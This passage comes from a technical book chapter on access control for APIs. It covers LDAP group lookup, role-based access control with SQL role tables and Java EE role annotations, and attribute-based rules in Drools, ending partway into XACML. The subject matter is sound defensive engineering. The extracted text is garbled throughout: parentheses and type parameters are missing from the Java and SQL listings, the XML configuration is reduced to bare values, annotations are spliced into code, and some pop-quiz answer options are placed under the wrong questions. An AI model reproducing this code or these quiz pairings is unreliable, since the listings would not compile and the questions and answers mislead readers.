                     queryBuilder.append " OR user_or_group_id = ?", group ;           }                                                                     queryBuilder.append " " ;                                              var perms = database.findAll String.class,                 queryBuilder.build   ;         if  perms.stream  .noneMatch p -> p.contains permission    {               halt 403 ;                                                         }     }; }  Fail if none of the permissions for the user or groups allow this action.  You may be wondering why you would split out looking up the user’s groups during authentication to then just use them in a second query against the permissions table during access control. It would be more efficient instead to perform a single query that automatically checked the groups for a user using a JOIN or sub-query against the group membership table, such as the following:  SELECT perms FROM permissions  WHERE space_id = ?    AND  user_or_group_id = ?           OR user_or_group_id IN             SELECT DISTINCT group_id            FROM group_members               WHERE user_id = ?            Check for  permissions for  this user directly.  Check for permissions  for any groups the user  is a member of.  Although this query is more efficient, it is unlikely that the extra query of the original design will become a significant performance bottleneck. But combining the queries into one has a significant drawback in that it violates the layering of authentication and  access  control.  As  far  as  possible,  you  should  ensure  that  all  user  attributes required for access control decisions are collected during the authentication step, and then decide if the request is authorized using these attributes. As a concrete example of how violating this layering can cause problems, consider what would happen if you changed your API to use an external user store such as LDAP  discussed in the next section   or  an  OpenID  Connect  identity  provider   chapter  7 .  In  these  cases,  the groups that a user is a  member of are likely  to  be  returned as  additional  attributes during authentication  such as in the ID token JWT  rather than exist in the API’s own database.  8.1.1  LDAP groups  In many large organizations, including most companies, users are managed centrally in an LDAP  Lightweight Directory Access Protocol  directory. LDAP is designed for storing  user  information  and  has  built-in  support  for  groups.  You  can  learn  more about  LDAP  at  https:  ldap.com basic-ldap-concepts .  The  LDAP  standard  defines the following two forms of groups:   272  CHAPTER 8 Identity-based access control  1 Static groups are defined using the groupOfNames or groupOfUniqueNames object classes,1  which  explicitly  list  the  members  of  the  group  using  the  member  or uniqueMember attributes. The difference between the two is that groupOfUnique- Names forbids the same member being listed twice.  2 Dynamic groups are defined using the groupOfURLs object class, where the mem- bership of the group is given by a collection of LDAP URLs that define search queries against the directory. Any entry that matches one of the search URLs is a member of the group.  Some directory servers also support virtual static groups, which look like static groups but query a dynamic group to determine the membership. Dynamic groups can be useful when groups become very large, because they avoid having to explicitly list every member of the group, but they can cause performance problems as the server needs  to  perform  potentially  expensive  search  operations  to  determine  the  mem- bers of a group.   To find which static groups a user is a member of in LDAP, you must perform a search against the directory for all groups that have that user’s distinguished name as a value of their member attribute, as shown in listing 8.3. First, you need to connect to the LDAP server using the Java Naming and Directory Interface  JNDI  or another LDAP client library. Normal LDAP users typically are not permitted to run searches, so you should use a separate JNDI InitialDirContext for looking up a user’s groups, configured  to  use  a  connection  user  that  has  appropriate  permissions.  To  find  the groups that a user is in, you can use the following search filter, which finds all LDAP groupOfNames entries that contain the given user as a member:   & objectClass=groupOfNames  member=uid=test,dc=example,dc=org    To  avoid  LDAP  injection  vulnerabilities   explained  in  chapter  2 ,  you  can  use  the facilities in JNDI to let search filters have parameters. JNDI will then make sure that any user input in these parameters is properly escaped before passing it to the LDAP directory. To use this, replace the user input in the field with a numbered parameter  starting at 0  in the form {0} or {1} or {2}, and so on, and then supply an Object array with the actual arguments to the search method. The names of the groups can then be found by looking up the CN  Common Name  attribute on the results.  Listing 8.3 Looking up LDAP groups for a user  import javax.naming.*; import javax.naming.directory.*; import java.util.*;  private List  lookupGroups String username          throws NamingException {     var props = new Properties  ;  1 An object class in LDAP defines the schema of a directory entry, describing which attributes it contains.

Use query parameters  to avoid LDAP injection  vulnerabilities.      while  results.hasMore    {         var result = results.next  ;         groups.add  String  result.getAttributes                   .get "cn" .get 0  ;                            }  Extract the CN attribute  of each group the user  is a member of.      directory.close  ;      return groups; }  To make looking up the groups a user belongs to more efficient, many directory serv- ers support a virtual attribute on the user entry itself that lists the groups that user is a member  of.  The  directory  server  automatically  updates  this  attribute  as  the  user  is added to and removed from groups  both static and dynamic . Because this attribute is nonstandard, it can have different names but is often called isMemberOf or some- thing similar. Check the documentation for your LDAP server to see if it provides such an attribute. Typically, it is much more efficient to read this attribute than to search for the groups that a user is a member of.  TIP If you need to search for groups regularly, it can be worthwhile to cache the results for a short period to prevent excessive searches on the directory.   274  CHAPTER 8 Identity-based access control  Pop quiz 1  True or False: In general, can groups contain other groups as members?  2 Which three of the following are common types of LDAP groups?   & objectClass=A  member=uid=alice,dc=example,dc=com    which  one  of  the  following  object  classes  would  be  inserted  into  the  position marked A to search for static groups Alice belongs to?  a Static groups b Abelian groups c Dynamic groups d Virtual static groups e Dynamic static groups f Virtual dynamic groups  3 Given the following LDAP filter:  a group b herdOfCats c groupOfURLs d groupOfNames e gameOfThrones f murderOfCrows g groupOfSubjects  The answers are at the end of the chapter.  8.2  Role-based access control Although  groups  can  make  managing  large  numbers  of  users  simpler,  they  do  not fully solve the difficulties of managing permissions for a complex API. First, almost all implementations of groups still allow permissions to be assigned to individual users as well as to groups. This means that to work out who has access to what, you still often need to examine the permissions for all users as well as the groups they belong to. Sec- ond, because groups are often used to organize users for a whole organization  such as in a central LDAP directory , they sometimes cannot be very useful distinctions for your API. For example, the LDAP directory might just have a group for all software engineers,  but  your  API  needs  to  distinguish  between  backend  and  frontend  engi- neers, QA, and scrum masters. If you cannot change the centrally managed groups, then you are back to managing permissions for individual users. Finally, even when groups are a good fit for an API, there may be large numbers of fine-grained permis- sions assigned to each group, making it difficult to review the permissions.   To address these drawbacks, role-based access control  RBAC  introduces the notion of  role  as  an  intermediary  between  users  and  permissions,  as  shown  in figure  8.2.   Role-based access control  275  Moderator  role  Admin role  Permission  Permission  Permission  Permission  User  Users are assigned roles.  Permissions are assigned to roles, never directly to users.  Figure 8.2 In RBAC, permissions  are assigned to roles rather than  directly to users. Users are then  assigned to roles, depending on  their required level of access.  Permissions are no longer directly assigned to users  or to groups . Instead, permis- sions are assigned to roles, and then roles are assigned to users. This can dramatically simplify the management of permissions, because it is much simpler to assign some- body the “moderator” role than to remember exactly which permissions a moderator is supposed to have. If the permissions change over time, then you can simply change the permissions associated with a role without needing to update the permissions for many users and groups individually.    In  principle,  everything  that  you  can  accomplish  with  RBAC  could  be  accom- plished with groups, but in practice there are several differences in how they are used, including the following:   Groups are used primarily to organize users, while roles are mainly used as a  way to organize permissions.   As  discussed  in  the  previous  section,  groups  tend  to  be  assigned  centrally, whereas roles tend to be specific to a particular application or API. As an exam- ple, every API may have an admin role, but the set of users that are administra- tors may differ from API to API.   Group-based systems often allow permissions to be assigned to individual users, but  RBAC  systems  typically  don’t  allow  that.  This  restriction  can  dramatically simplify the process of reviewing who has access to what.   RBAC systems split the definition and assigning of permissions to roles from the assignment of users to those roles. It is much less error-prone to assign a user to a role than to work out which permissions each role should have, so this is a use- ful separation of duties that improves security.   Roles may have a dynamic element. For example, some military and other envi- ronments have the concept of a duty officer, who has particular privileges and responsibilities only during their shift. When the shift ends, they hand over to the next duty officer, who takes on that role.  RBAC is almost always used as a form of mandatory access control, with roles being described and assigned by whoever controls the systems that are being accessed. It is much less common to allow users to assign roles to other users the way they can with permissions in discretionary access control approaches. Instead, it is common to layer   276  CHAPTER 8 Identity-based access control  a DAC mechanism such as OAuth2  chapter 7  over an underlying RBAC system so that a user with a moderator role, for example, can delegate some part of their per- missions to a third party. Some RBAC systems give users some discretion over which roles they use when performing API operations. For example, the same user may be able to send messages to a chatroom as themselves or using their role as Chief Finan- cial Officer when they want to post an official statement. The NIST  National Institute of Standards and Technology  standard RBAC model  http:  mng.bz v9eJ  includes a notion of session, in which a user can choose which of their roles are active at a given  time  when  making  API  requests.  This  works  similarly  to  scoped  tokens  in OAuth, allowing a session to activate only a subset of a user’s roles, reducing the dam- age if the session is compromised. In this way, RBAC also better supports the principle of least privilege than groups because a user can act with only a subset of their full authority.  8.2.1 Mapping roles to permissions  There  are  two  basic  approaches  to  mapping  roles  to  lower-level  permissions  inside your API. The first is to do away with permissions altogether and instead to just anno- tate each operation in your API with the role or roles that can call that operation. In this case, you’d replace the existing requirePermission filter with a new requireRole filter  that  enforced  role  requirements  instead.  This  is  the  approach  taken  in  Java Enterprise Edition  Java EE  and the JAX-RS framework, where methods can be anno- tated with the @RolesAllowed annotation to describe which roles can call that method via an API, as shown in listing 8.4.  Listing 8.4 Annotating methods with roles in Java EE  import javax.ws.rs.*; import javax.ws.rs.core.*; import javax.annotation.security.*;      Role annotations are in the  javax.annotation.security package.  @DeclareRoles {"owner", "moderator", "member"}       @Path " spaces {spaceId} members"  public class SpaceMembersResource {  Declare roles with  the @DeclareRoles  annotation.      @POST     @RolesAllowed "owner"                       public Response addMember   { .. }      @GET     @RolesAllowed {"owner", "moderator"}        public Response listMembers   { .. } }  Describe role  restrictions with the  @RolesAllowed  annotation.  The second approach is to  retain  an  explicit notion of  lower-level permissions, like those currently used in the Natter API, and to define an explicit mapping from roles to permissions. This can be useful if you want to allow administrators or other users to   Role-based access control  277  define new roles from scratch, and it also makes it easier to see exactly what permis- sions a role has been granted without having to examine the source code of the API. Listing 8.5 shows the SQL needed to define four new roles based on the existing Nat- ter API permissions:   The social space owner has full permissions.  A moderator can read posts and delete offensive posts.  A normal member can read and write posts, but not delete any.  An observer is only allowed to read posts and not write their own.  Open src main resources schema.sql in your editor and add the lines from listing 8.5 to the end of the file and click save. You can also delete the existing permissions table  and associated GRANT statements  if you wish.  Listing 8.5 Role permissions for the Natter API  CREATE TABLE role_permissions                       role_id VARCHAR 30  NOT NULL PRIMARY KEY,       perms VARCHAR 3  NOT NULL                    ; INSERT INTO role_permissions role_id, perms      VALUES  'owner', 'rwd' ,                      'moderator', 'rd' ,                   'member', 'rw' ,                      'observer', 'r' ;         GRANT SELECT ON role_permissions TO natter_api_user;        Each role grants a  set of permissions.  Because the roles  are fixed, the API is  granted read-only  access.  Static roles Now that you’ve defined how roles map to permissions, you just need to decide how to map users to roles. The most common approach is to statically define which users  or groups  are assigned to which roles. This is the approach taken by most Java EE appli- cation servers, which define configuration files to list the users and groups that should be assigned different roles. You can implement the same kind of approach in the Nat- ter API by adding a new table to map users to roles within a social space. Roles in the Natter API are scoped to each social space so that the owner of one social space can- not make changes to another.  DEFINITION When  users,  groups,  or  roles  are  confined  to  a  subset  of  your application, this is known as a security domain or realm.  Listing 8.6 shows the SQL to create a new table to map a user in a social space to a role.  Open  schema.sql  again  and  add  the  new  table  definition  to  the  file.  The user_roles table, together with the role_permissions table, take the place of the old permissions  table.  In  the  Natter  API,  you’ll  restrict  a  user  to  having  just  one  role within a space, so you can add a primary key constraint on the space_id and user_id fields. If you wanted to allow more than one role you could leave this out and manually  Define roles for Natter social spaces.  8.2.2   278  CHAPTER 8 Identity-based access control  add an index on those fields instead. Don’t forget to grant permissions to the Natter API database user.  Listing 8.6 Mapping static roles  Map users to roles within a space.  CREATE TABLE user_roles                                                      space_id INT NOT NULL REFERENCES spaces space_id ,                       user_id VARCHAR 30  NOT NULL REFERENCES users user_id ,                  role_id VARCHAR 30  NOT NULL REFERENCES role_permissions role_id ,       PRIMARY KEY  space_id, user_id                                      ; GRANT SELECT, INSERT, DELETE ON user_roles TO natter_api_user;      Natter restricts each user to have only one role.  Grant permissions to the Natter database user.  To grant roles to users, you need to update the two places where permissions are cur- rently granted inside the SpaceController class:   In the createSpace method, the owner of the new space is granted full permis-  sions. This should be updated to instead grant the owner role.   In  the  addMember  method,  the  request  contains  the  permissions  for  the  new member. This should be changed to accept a role for the new member instead.  The first task is accomplished by opening the SpaceController.java file and finding the line inside the createSpace method where the insert into the permissions table state- ment is. Remove those lines and replace them instead with the following to insert a new role assignment:    database.updateUnique        "INSERT INTO user_roles space_id, user_id, role_id  " +               "VALUES ?, ?, ? ", spaceId, owner, "owner" ;  Updating addMember involves a little more code, because you should ensure that you validate the  new  role.  Add  the  following  line  to the  top  of the  class  to  define  the valid roles:    private static final Set  DEFINED_ROLES =           Set.of "owner", "moderator", "member", "observer" ;  You can now update the implementation of the addMember method to be role-based instead of permission-based, as shown in listing 8.7. First, extract the desired role from the request and ensure it is a valid role name. You can default to the  member role if none is specified as this is the normal role for most members. It is then simply a case of inserting the role into the user_roles table instead of the old permissions table and returning the assigned role in the response.  Listing 8.7 Adding new members with roles  public JSONObject addMember Request request, Response response  {   var json = new JSONObject request.body   ;   Role-based access control  279    var spaceId = Long.parseLong request.params ":spaceId"  ;   var userToAdd = json.getString "username" ;   var role = json.optString "role", "member" ;                if  !DEFINED_ROLES.contains role   {                         throw new IllegalArgumentException "invalid role" ;      }  Extract the role  from the input  and validate it.    database.updateUnique            "INSERT INTO user_roles space_id, user_id, role_id " +                      " VALUES ?, ?, ? ", spaceId, userToAdd, role ;     Insert the new role assignment for this space.    response.status 200 ;   return new JSONObject             .put "username", userToAdd            .put "role", role ;          }  Return the role in  the response.  8.2.3 Determining user roles  The final step of the puzzle is to determine which roles a user has when they make a request to the API and the permissions that each role allows. This can be found by look- ing up the user in the user_roles table to discover their role for a given space, and then looking up the permissions assigned to that role in the role_permissions table. In con- trast to the situation with groups in section 8.1, roles are usually specific to an API, so it is less likely that you would be told a user’s roles as part of authentication. For this rea- son, you can combine the lookup of roles and the mapping of roles into permissions into a single database query, joining the two tables together, as follows:  SELECT rp.perms   FROM role_permissions rp   JOIN user_roles ur     ON ur.role_id = rp.role_id  WHERE ur.space_id = ? AND ur.user_id = ?  Searching the database for roles and permissions can be expensive, but the current implementation  will  repeat  this  work  every  time  the  requirePermission  filter  is called, which could be several times while processing a request. To avoid this issue and simplify the logic, you can extract the permission look up into a separate filter that runs before any permission checks and stores the permissions in a request attribute. Listing 8.8 shows the new lookupPermissions filter that performs the mapping from user to role to permissions, and then updated requirePermission method. By reus- ing  the  existing  permissions  checks,  you  can  add  RBAC  on  top  without  having  to change the access control rules. Open UserController.java in your editor and update the requirePermission method to match the listing.  Listing 8.8 Determining permissions based on roles  public void lookupPermissions Request request, Response response  {     requireAuthentication request, response ;   280  CHAPTER 8 Identity-based access control      var spaceId = Long.parseLong request.params ":spaceId"  ;     var username =  String  request.attribute "subject" ;  Store permissions in a request attribute.      var perms = database.findOptional String.class,                          "SELECT rp.perms " +                                             "  FROM role_permissions rp JOIN user_roles ur" +                "    ON rp.role_id = ur.role_id" +                               " WHERE ur.space_id = ? AND ur.user_id = ?",                     spaceId, username .orElse "" ;                           request.attribute "perms", perms ;     }  Determine user  permissions by  mapping user  to role to  permissions.  public Filter requirePermission String method, String permission  {     return  request, response  -> {         if  !method.equals request.requestMethod     {             return;         }          var perms = request. attribute "perms" ;             if  !perms.contains permission   {             halt 403 ;         }     }; }  Retrieve  permissions  from the  request before  checking.  You now need to add calls to the new filter to ensure permissions are looked up. Open the Main.java file and add the following lines to the main method, before the defini- tion of the postMessage operation:  before " spaces :spaceId messages",      userController::lookupPermissions ; before " spaces :spaceId messages *",      userController::lookupPermissions ; before " spaces :spaceId members",      userController::lookupPermissions ;  If you restart the API server you can now add users, create spaces, and add members using the new RBAC approach. All the existing permission checks on API operations are still enforced, only now they are managed using roles instead of explicit permis- sion assignments.  8.2.4 Dynamic roles  Though  static  role  assignments  are  the  most  common,  some  RBAC  systems  allow more dynamic queries to determine which roles a user should have. For example, a call  center  worker  might  be  granted  a  role  that  allows  them  access  to  customer records so that they can respond to customer support queries. To reduce the risk of misuse, the system could be configured to grant the worker this role only during their contracted working hours, perhaps based on their shift times. Outside of these times the user would not be granted the role, and so would be denied access to customer records if they tried to access them.   Role-based access control  281   Although dynamic role assignments have been implemented in several systems, there is no clear standard for how to build dynamic roles. Approaches are usually based  on  database  queries  or  perhaps  based  on  rules  specified  in  a  logical  form such as Prolog or the Web Ontology Language  OWL . When more flexible access control rules are required, attribute-based access control  ABAC  has largely replaced RBAC, as discussed in section 8.3. NIST has attempted to integrate ABAC with RBAC to gain the best of both worlds  http:  mng.bz 4BMa , but this approach is not widely adopted.    Other  RBAC  systems  implement  constraints,  such  as  making  two  roles  mutually exclusive; a user can’t have both roles at the same time. This can be useful for enforc- ing separation of duties, such as preventing a system administrator from also manag- ing audit logs for a sensitive system.  Pop quiz 4 Which of the following are more likely to apply to roles than to groups?  a Roles are usually bigger than groups. b Roles are usually smaller than groups. c All permissions are assigned using roles. d Roles better support separation of duties. e Roles are more likely to be application specific. f Roles allow permissions to be assigned to individual users.  5 What is a session used for in the NIST RBAC model? Pick one answer.  a To allow users to share roles. b To allow a user to leave their computer unlocked. c To allow a user to activate only a subset of their roles. d To remember the users name and other identity attributes. e To allow a user to keep track of how long they have worked.  6 Given the following method definition      @      public Response adminOnlyMethod String arg ;  what annotation  value  can be used in  the Java EE and  JAX-RS role system to restrict the method to only be called by users with the ADMIN role?  a @DenyAll b @PermitAll c @RunAs "ADMIN"  d @RolesAllowed "ADMIN"  e @DeclareRoles "ADMIN"   The answers are at the end of the chapter.   282  8.3  CHAPTER 8 Identity-based access control  Attribute-based access control Although RBAC is a very successful access control model that has been widely deployed, in many cases the desired access control policies cannot be expressed through simple role assignments. Consider the call center agent example from section 8.2.4. As well as preventing  the  agent  from  accessing  customer  records  outside  of  their  contracted working hours, you might also want to prevent them accessing those records if they are not  actually  on a call with that  customer. Allowing  each  agent to access all cus- tomer records during their working hours is still more authority than they really need to get their job done, violating the principle of least privilege. It may be that you can determine  which  customer  the  call  agent  is  talking  to  from  their  phone  number  caller  ID ,  or  perhaps  the  customer  enters  an  account  number  using  the  keypad before they are connected to an agent. You’d like to only allow the agent access to just that customer’s file for the duration of the call, perhaps allowing five minutes after- ward for them to finishing writing any notes.   To handle these kinds of dynamic access control decisions, an alternative to RBAC has been developed known as ABAC: attribute-based access control. In ABAC, access con- trol  decisions  are  made  dynamically  for  each  API  request  using  collections  of  attri- butes grouped into four categories:   Attributes about the subject; that is, the user making the request. This could include their username, any groups they belong to, how they were authenticated, when they last authenticated, and so on.   Attributes  about  the  resource  or  object  being  accessed,  such  as  the  URI  of  the  resource or a security label  TOP SECRET, for example .   Attributes about the action the user is trying to perform, such as the HTTP method.  Attributes about the environment or context in which the operation is taking place. This might include the local time of day, or the location of the user performing the action.  The output of ABAC is then an allow or deny decision, as shown in figure 8.3.  Subject attributes  Resource attributes  Action attributes  Environment attributes  ABAC  Permit Deny  Attributes related to an API request are fed into the ABAC system.  A decision is made based on the attributes and conﬁgured security policy.  Figure 8.3 In an ABAC system, access control decisions are made dynamically based  on attributes describing the subject, resource, action, and environment or context of the  API request.   Attribute-based access control  283  Listing 8.9 shows example code for gathering attribute values to feed into an ABAC decision process in the Natter API. The code implements a Spark filter that can be included before any API route definition in place of the existing requirePermission filters. The actual implementation of the ABAC permission check is left abstract for now; you will develop implementations in the next sections. The code collects attri- butes  into  the  four  attribute  categories  described  above  by  examining  the  Spark Request  object  and  extracting  the  username  and  any  groups  populated  during authentication. You can include other attributes, such as the current time, in the envi- ronment properties. Extracting these kind of environmental attributes makes it easier to test the access control rules because you can easily pass in different times of day in your tests. If you’re using JWTs  chapter 6 , then you might want to include claims from the JWT Claims Set in the subject attributes, such as the issuer or the issued-at time. Rather than using a simple boolean value to indicate the decision, you should use a custom Decision class. This is used to combine decisions from different policy rules, as you’ll see in section 8.3.1.  Listing 8.9 Gathering attribute values  package com.manning.apisecurityinaction.controller;  import java.time.LocalTime; import java.util.Map;  import spark.*;  import static spark.Spark.halt;  public abstract class ABACAccessController {      public void enforcePolicy Request request, Response response  {          var subjectAttrs = new HashMap   ;                  subjectAttrs.put "user", request.attribute "subject"  ;            subjectAttrs.put "groups", request.attribute "groups"  ;            var resourceAttrs = new HashMap   ;                 resourceAttrs.put "path", request.pathInfo   ;                     resourceAttrs.put "space", request.params ":spaceId"  ;             var actionAttrs = new HashMap   ;                   actionAttrs.put "method", request.requestMethod   ;                 var envAttrs = new HashMap   ;                      envAttrs.put "timeOfDay", LocalTime.now   ;                        envAttrs.put "ip", request.ip   ;                           Check whether the request is permitted.          var decision = checkPermitted subjectAttrs, resourceAttrs,                     actionAttrs, envAttrs ;                                         if  !decision.isPermitted    {                  halt 403 ;                       If not, halt with a 403  Forbidden error.  Gather relevant  attributes and  group them into  categories.   284  CHAPTER 8 Identity-based access control          }     }      abstract Decision checkPermitted              Map  subject,             Map  resource,             Map  action,             Map  env ;      public static class Decision {          } }  The Decision class will  be described next.  8.3.1  Combining decisions When implementing ABAC, typically access control decisions are structured as a set of independent rules describing whether a request should be permitted or denied. If more than one rule matches a request, and they have different outcomes, then the question is which one should be preferred. This boils down to the two following questions:   What should the default decision be if no access control rules match the request?  How should conflicting decisions be resolved?  The safest option is to default to denying requests unless explicitly permitted by some access rule, and to give deny decisions priority over permit decisions. This requires at least one rule to match and decide to permit the action and no rules to decide to deny the action for the request to be allowed. When adding ABAC on top of an existing access  control  system  to  enforce  additional  constraints  that  cannot  be  expressed  in the existing system, it can be simpler to instead opt for a default permit strategy where requests are permitted to proceed if no ABAC rules match at all. This is the approach you’ll take with the Natter API, adding additional ABAC rules that deny some requests and let all others through. In this case, the other requests may still be rejected by the existing RBAC permissions enforced earlier in the chapter.    The  logic  for  implementing  this  default  permit  with  deny  overrides  strategy  is shown in the Decision class in listing 8.10. The permit variable is initially set to true but any call to the deny   method will set it to false. Calls to the permit   method are ignored because this is the default unless another rule has called deny   already, in which  case  the  deny  should  take  precedence.  Open  ABACAccessController.java  in your editor and add the Decision class as an inner class.  Listing 8.10 Implementing decision combining      public static class Decision {         private boolean permit = true;      Default to  permit          public void deny   {                 permit = false;              }  An explicit deny decision  overrides the default.   Attribute-based access control  285          public void permit   {            }          boolean isPermitted   {             return permit;         }     }  Explicit permit  decisions are  ignored.  8.3.2  Implementing ABAC decisions Although  you  could  implement  ABAC  access  control  decisions  directly  in  Java  or another  programming  language,  it’s  often  clearer  if  the  policy  is  expressed  in  the form  of  rules  or  domain-specific  language   DSL   explicitly  designed  to  express  access control  decisions.  In  this  section  you’ll  implement  a  simple  ABAC  decision  engine using the Drools  https:  drools.org  business rules engine from Red Hat. Drools can be  used  to  write  all  kinds  of  business  rules  and  provides  a  convenient  syntax  for authoring access control rules.   TIP Drools  is  part  of  a  larger  suite  of  tools  marketed  under  the  banner “Knowledge  is  Everything,”  so  many  classes  and  packages  used  in  Drools include the kie abbreviation in their names.  To add the Drools rule engine to the Natter API project, open the pom.xml file in your editor and add the following dependencies to the   section:               org.kie         kie-api         7.26.0.Final                     org.drools         drools-core         7.26.0.Final                     org.drools         drools-compiler         7.26.0.Final         When it starts up, Drools will look for a file called kmodule.xml on the classpath that defines the configuration. You can use the default configuration, so navigate to the folder src main resources and create a new folder named META-INF under resources. Then create a new file called kmodule.xml inside the src main resource META-INF folder with the following contents:          286  CHAPTER 8 Identity-based access control  You can now implement a version of the ABACAccessController class that evaluates decisions using Drools. Listing 8.11 shows code that implements the checkPermitted method  by  loading  rules  from  the  classpath  using  KieServices.get  .getKie- ClasspathContainer  .    To query the rules for a decision, you should first create a new KIE session and set an instance of the Decision class from the previous section as a global variable that the rules  can  access.  Each  rule  can  then  call  the  deny    or  permit    methods  on  this object to indicate whether the request should be allowed. The attributes can then be added to the working memory for Drools using the insert   method on the session. Because Drools prefers strongly typed values, you can wrap each set of attributes in a simple wrapper class to distinguish them from each other  described shortly . Finally, call  session.fireAllRules    to  evaluate  the  rules  against  the  attributes  and  then check the value of the decision variable to determine the final decision. Create a new file named DroolsAccessController.java inside the controller folder and add the con- tents of listing 8.11.  Listing 8.11 Evaluating decisions with Drools  package com.manning.apisecurityinaction.controller;  import java.util.*;  import org.kie.api.KieServices; import org.kie.api.runtime.KieContainer;  Load all rules found in the classpath.  public class DroolsAccessController extends ABACAccessController {      private final KieContainer kieContainer;      public DroolsAccessController   {         this.kieContainer = KieServices.get  .getKieClasspathContainer  ;      }      @Override     boolean checkPermitted Map  subject,                            Map  resource,                            Map  action,                            Map  env  {  Create a Decision object and set it as a global variable named “decision.”          var session = kieContainer.newKieSession  ;               try {             var decision = new Decision  ;                          session.setGlobal "decision", decision ;     Start a new  Drools session.              session.insert new Subject subject  ;                  session.insert new Resource resource  ;                session.insert new Action action  ;                    session.insert new Environment env  ;       Run the rule engine to see which rules match the request and check the             session.fireAllRules  ;            decision.             return decision.isPermitted  ;      Insert facts for  each category  of attributes.   Attribute-based access control  287          } finally {             session.dispose  ;              }     } }  Dispose of the  session when  finished.  As mentioned, Drools likes to work with strongly typed values, so you can wrap each collection of attributes in a distinct class to make it simpler to write rules that match each one, as shown in listing 8.12. Open DroolsAccessController.java in your editor again and add the four wrapper classes from the following listing as inner classes to the DroolsAccessController class.  Listing 8.12 Wrapping attributes in types  public static class Subject extends HashMap  {        Subject Map  m  { super m ; }                 }                                                                 Wrapper for  subject-related  attributes  public static class Resource extends HashMap  {       Resource Map  m  { super m ; }                }                                                                 Wrapper for  resource-related  attributes  public static class Action extends HashMap  {     Action Map  m  { super m ; } }  public static class Environment extends HashMap  {     Environment Map  m  { super m ; } }  You  can  now  start  writing  access  control  rules.  Rather  than  reimplementing  all  the existing RBAC access control checks, you will just add an additional rule that prevents moderators from deleting messages outside of normal office hours. Create a new file accessrules.drl in the folder src main resources to contain the rules. Listing 8.13 lists the  example rule.  As for  Java, a  Drools rule  file can contain a  package and  import statements, so use those to import the Decision and wrapper class you’ve just created. Next, you need to declare the global decision variable that will be used to communi- cate the decision by the rules. Finally, you can implement the rules themselves. Each rule has the following form:  rule "description"     when        conditions     then        actions end  The description can be any useful string to describe the rule. The conditions of the rule match classes that have been inserted into the working memory and consist of   288  CHAPTER 8 Identity-based access control  the  class  name  followed  by  a  list  of  constraints  inside  parentheses.  In  this  case, because the classes are maps, you can use the this["key"] syntax to match attributes inside the map. For this rule, you should check that the HTTP method is DELETE and  that  the  hour  field  of  the  timeOfDay  attribute  is  outside  of  the  allowed  9-to-5 working hours. If the rule matches, the action of the rule will call the deny   method of the decision global variable. You can find more detailed information about writing Drools rules on the https:  drools.org website, or from the book Mastering JBoss Drools 6, by Mauricio Salatino, Mariano De Maio, and Esteban Aliverti  Packt, 2016 .  Listing 8.13 An example ABAC rule  package com.manning.apisecurityinaction.rules;         import com.manning.apisecurityinaction.controller. ➥ DroolsAccessController.*;                          import com.manning.apisecurityinaction.controller. ➥ ABACAccessController.Decision;                      Add package  and import  statements just  like Java.  global Decision decision;      Declare the decision global variable.  Patterns match the attributes.  rule "deny moderation outside office hours"         when                                                Action  this["method"] == "DELETE"                 Environment  this["timeOfDay"].hour < 9                 this["timeOfDay"].hour > 17             then                                                decision.deny  ;      end  The action can call the permit or  deny methods on the decision.  A rule has a description,  a when section with  patterns, and a then  section with actions.  Now that you have written an ABAC rule you can wire up the main method to apply your rules as a Spark before   filter that runs before the other access control rules. The  filter  will  call  the  enforcePolicy  method  inherited  from  the  ABACAccess- Controller  listing 8.9 , which populates the attributes from the requests. The base class then calls the checkDecision method from listing 8.11, which will use Drools to evaluate the rules. Open Main.java in your editor and add the following lines to the main   method just before the route definitions in that file:      var droolsController = new DroolsAccessController  ;     before " *", droolsController::enforcePolicy ;  Restart  the  API  server  and  make  some  sample  requests  to  see  if  the  policy  is  being enforced and is not interfering with the existing RBAC permission checks. To check that DELETE requests are being rejected outside of office hours, you can either adjust your computer’s clock to a different time, or you can adjust the time of day environ- ment attribute to artificially set the time of day to 11 p.m. Open ABACAccessController .java and change the definition of the timeOfDay attribute as follows:  envAttrs.put "timeOfDay", LocalTime.now  .withHour 23  ;   Attribute-based access control  289  If you then try to make any DELETE request to the API it’ll be rejected:  $ curl -i -X DELETE \   -u demo:password https:  localhost:4567 spaces 1 messages 1 HTTP 1.1 403 Forbidden …  TIP It doesn’t matter if you haven’t implemented any DELETE methods in the Natter API, because the ABAC rules will be applied before the request is matched to any endpoints  even if none exist . The Natter API implementa- tion in the GitHub repository accompanying this book has implementations of several additional REST requests, including DELETE support, if you want to try it out.  8.3.3  Policy agents and API gateways ABAC enforcement can be complex as policies increase in complexity. Although gen- eral-purpose rule engines such as Drools can simplify the process of writing ABAC rules, specialized  components  have  been  developed  that  implement  sophisticated  policy enforcement. These components are typically implemented either as a policy agent that plugs into an existing application server, web server, or reverse proxy, or else as stand- alone gateways that intercept requests at the HTTP layer, as illustrated in figure 8.4.  HTTP requests  Policy agents can plug into an application server, web server, or reverse proxy.  Reverse proxy  Policy agent  API gateway  Policy engine  Application server  Policy agent  API  Some API gateways can also enforce ABAC policies.  Figure 8.4 A policy agent can plug into an application server or reverse  proxy to enforce ABAC policies. Some API gateways can also enforce policy  decisions as standalone components.  For example, the Open Policy Agent  OPA, https:  www.openpolicyagent.org  imple- ments a policy engine using a DSL designed to make expressing access control deci- sions easy. It can be integrated into an existing infrastructure either using its REST   290  CHAPTER 8 Identity-based access control  API or as a Go library, and integrations have been written for various reverse proxies and gateways to add policy enforcement.  8.3.4 Distributed policy enforcement and XACML  Rather than combining all the logic of enforcing policies into the agent itself, another approach is to centralize the definition of policies in a separate server, which provides a REST API for policy agents to connect to and evaluate policy decisions. By centraliz- ing policy decisions, a security team can more easily review and adjust policy rules for all APIs in an organization and ensure consistent rules are applied. This approach is most closely associated with XACML, the eXtensible Access-Control Markup Language  see http:  mng.bz Qx2w , which defines an XML-based language for policies with a rich set of functions for matching attributes and combining policy decisions. Although the XML format for defining policies has fallen somewhat out of favor in recent years, XACML also defined a reference architecture for  ABAC systems that has been very influential and is now incorporated into NIST’s recommendations for ABAC  http:   mng.bz X0YG .  DEFINITION XACML  is  the  eXtensible  Access-Control  Markup  Language,  a standard  produced  by  the  OASIS  standards  body.  XACML  defines  a  rich XML-based policy language and a reference architecture for distributed pol- icy enforcement.  The core components of the XACML reference architecture are shown in figure 8.5, and consist of the following functional components:   A Policy Enforcement Point  PEP  acts like a policy agent to intercept requests to  an API and reject any requests that are denied by policy.   The PEP talks to a Policy Decision Point  PDP  to determine if a request should be allowed. The PDP contains a policy engine like those you’ve seen already in this chapter.   A Policy Information Point  PIP  is responsible for retrieving and caching values of  relevant  attributes  from  different  data  sources.  These  might  be  local  data- bases or remote services such as an OIDC UserInfo endpoint 